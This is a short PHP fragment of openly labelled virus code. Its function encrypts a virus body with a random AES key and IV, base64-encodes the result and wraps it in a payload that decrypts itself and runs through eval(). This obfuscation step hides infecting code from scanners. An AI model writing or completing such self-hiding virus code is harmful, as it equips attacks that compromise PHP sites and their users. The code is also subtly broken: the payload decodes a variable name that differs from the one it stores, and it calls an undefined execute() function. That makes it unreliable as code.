<?php
    //VIRUS:END

    function encryptedVirus($virus){
        //Generate Key
        $str = '0123456789abcdef';
        $key = '';
        for($i=0; $i<64; ++$i) $key .= $str[rand(0, strlen($str)-1)];

        // pack the key into a binary format
        $key = pack('H*', $key);


        //encrypt the virus
        $iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $encryptedVirus = mcrypt_encrypt(
            MCRYPT_RIJNDAEL_128,
            $key, 
            $virus,
            MCRYPT_MODE_CBC,
            $iv
        );

        //Encode
        $encodedVirus = base64_encode($encryptedVirus);
        $encodedIV = base64_encode($iv);
        $encodedKey = base64_encode($key);


        //payload in form of a virus itself.
        $payload = "
            \$encodedVirus = '$encodedVirus';
            \$iv = '$encodedIV';
            \$key = '$encodedKey';
        

            //Decrypt
            \$virus = mcrypt_decrypt(
                MCRYPT_RIJNDAEL_128,
                base64_decode(\$key),
                base64_decode(\$encryptedVirus),
                MCRYPT_MODE_CBC,
                base64_decode(\$iv)
            );
            eval(\$virus);
            execute(\$virus);
        ";
        
        return $payload;
    }
